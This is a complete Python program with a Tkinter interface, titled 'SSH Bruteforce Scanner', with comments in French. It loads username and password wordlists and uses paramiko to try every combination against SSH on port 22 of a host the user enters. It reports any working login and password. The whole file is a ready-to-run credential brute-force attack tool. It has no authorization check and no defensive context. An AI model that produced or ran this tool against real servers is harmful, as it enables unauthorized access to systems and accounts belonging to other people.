import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.scrolledtext import ScrolledText
import paramiko
from tqdm import tqdm

def read_file(file_path):
    with open(file_path, "r") as file:
        content = file.read().splitlines()
    return content

def ssh_bruteforce(host, port, username_list, password_list):
    # Boucle sur tous les noms d'utilisateur
    for username in username_list:
        # Boucle sur tous les mots de passe
        for password in tqdm(password_list, desc=f"Trying {username}"):
            try:
                # Création d'une connexion SSH
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
                print(f"[+] Login successful! Username: {username}, Password: {password}")
                ssh.close()
                return (username, password)  # Retourne le nom d'utilisateur et le mot de passe si le login est réussi
            except paramiko.AuthenticationException:
                # Échec de l'authentification, essayer le prochain mot de passe
                continue
            except Exception as e:
                print(f"[-] An error occurred: {e}")
                return None  # Retourne None en cas d'erreur
    print("[-] Bruteforce unsuccessful.")
    return None  # Retourne None si toutes les combinaisons ont été essayées sans succès

def scan_ssh():
    # Récupérer l'adresse IP ou l'hostname de l'entrée utilisateur
    host = entry_host.get()
    if not host:
        messagebox.showwarning("Warning", "Please enter a valid IP address or hostname.")
        return

    # Récupérer le chemin des fichiers de login et de mot de passe
    username_file = entry_username.get()
    password_file = entry_password.get()
    if not username_file or not password_file:
        messagebox.showwarning("Warning", "Please select both username and password files.")
        return

    # Lire les fichiers pour récupérer les listes de noms d'utilisateur et de mots de passe
    usernames = read_file(username_file)
    passwords = read_file(password_file)

    # Appel de la fonction de bruteforce SSH
    result = ssh_bruteforce(host, 22, usernames, passwords)

    # Affichage du résultat dans la zone de texte
    if result:
        username, password = result
        text_area.insert(tk.END, f"[+] Bruteforce successful! Username: {username}, Password: {password}\n")
    else:
        text_area.insert(tk.END, "[-] Bruteforce unsuccessful.\n")

# Création de la fenêtre principale
root = tk.Tk()
root.title("SSH Bruteforce Scanner")
root.geometry("800x600")

# Champ de saisie pour l'adresse IP ou l'hostname
entry_label_host = tk.Label(root, text="Enter IP address or hostname:")
entry_label_host.pack(pady=10)
entry_host = tk.Entry(root, width=50)
entry_host.pack()

# Bouton pour sélectionner le fichier de noms d'utilisateur
def select_username_file():
    file_path = filedialog.askopenfilename(title="Select username file", filetypes=[("Text files", "*.txt")])
    entry_username.delete(0, tk.END)
    entry_username.insert(0, file_path)

btn_select_username = tk.Button(root, text="Select username file", command=select_username_file)
btn_select_username.pack(pady=5)

entry_label_username = tk.Label(root, text="Username file:")
entry_label_username.pack()
entry_username = tk.Entry(root, width=50)
entry_username.pack()

# Bouton pour sélectionner le fichier de mots de passe
def select_password_file():
    file_path = filedialog.askopenfilename(title="Select password file", filetypes=[("Text files", "*.txt")])
    entry_password.delete(0, tk.END)
    entry_password.insert(0, file_path)

btn_select_password = tk.Button(root, text="Select password file", command=select_password_file)
btn_select_password.pack(pady=5)

entry_label_password = tk.Label(root, text="Password file:")
entry_label_password.pack()
entry_password = tk.Entry(root, width=50)
entry_password.pack()

# Bouton de scan
scan_button = tk.Button(root, text="Scan", command=scan_ssh)
scan_button.pack(pady=10)

# Zone de texte pour afficher les résultats
text_area = ScrolledText(root, wrap=tk.WORD, width=80, height=20)
text_area.pack(padx=10, pady=10)

# Affichage de la fenêtre
root.mainloop()
